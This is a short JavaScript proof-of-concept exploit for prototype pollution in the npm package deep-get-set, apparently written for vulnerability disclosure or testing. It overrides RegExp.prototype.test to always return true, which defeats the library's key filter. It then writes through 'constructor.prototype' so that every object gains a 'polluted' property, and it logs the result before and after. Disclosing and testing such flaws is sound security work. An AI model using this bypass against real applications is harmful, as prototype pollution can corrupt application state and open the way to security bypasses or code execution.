RegExp.prototype.test = () => true;
const deep = require('deep-get-set');
console.log({}.polluted);
deep({}, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);